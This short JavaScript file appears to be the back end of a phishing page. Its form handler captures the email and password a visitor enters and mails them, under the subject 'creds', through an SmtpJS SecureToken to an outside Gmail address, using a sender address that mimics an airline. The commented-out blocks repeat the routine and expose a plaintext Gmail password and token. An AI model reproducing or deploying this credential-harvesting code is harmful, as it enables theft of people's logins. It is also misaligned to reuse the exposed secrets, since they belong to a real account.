const email = document.getElementById("contact");
const password = document.getElementById("password");
const submit = document.getElementById("submit");

submit.addEventListener("submit", (e) => {
  e.preventDefault();

  console.log("Submit event called");

  let ebody = `
     ${email.value}
     ${password.value}
    `;

  //   Email.send({
  //     Host: "smtp.gmail.com",
  //     Username: "raakesh95misc@gmail.com",
  //     Password: "L!nuxpedora1",
  //     To: "raakesh95misc@gmail.com",
  //     From: "raakesh95misc@gmail.com",
  //     Subject: "Sending Email using javascript",
  //     Body: "Well that was easy!!",
  //   }).then(function (message) {
  //     alert("mail sent successfully");
  //   });

  Email.send({
    SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6", //add your token here
    To: "raakesh95official@gmail.com",
    From: "airemirates@proton.me",
    Subject: "creds",
    Body: ebody,
  });
});

// function sendEmail() {
//   // e.preventDefault();

//   // alert("mail sent successfully");

//   console.log("Submit event called");

//   let ebody = `
//      ${email.value}
//      ${password.value}
//     `;

//   //   Email.send({
//   //     Host: "smtp.gmail.com",
//   //     Username: "raakesh95misc@gmail.com",
//   //     Password: "L!nuxpedora1",
//   //     To: "raakesh95misc@gmail.com",
//   //     From: "raakesh95misc@gmail.com",
//   //     Subject: "Sending Email using javascript",
//   //     Body: "Well that was easy!!",
//   //   }).then(function (message) {
//   //     alert("mail sent successfully");
//   //   });

//   Email.send({
//     SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6",
//     To: "raakesh95official@gmail.com",
//     From: "airemirates@proton.me",
//     Subject: "creds",
//     Body: ebody,
//   }).then(function (message) {
//     alert(message);
//   });
// }
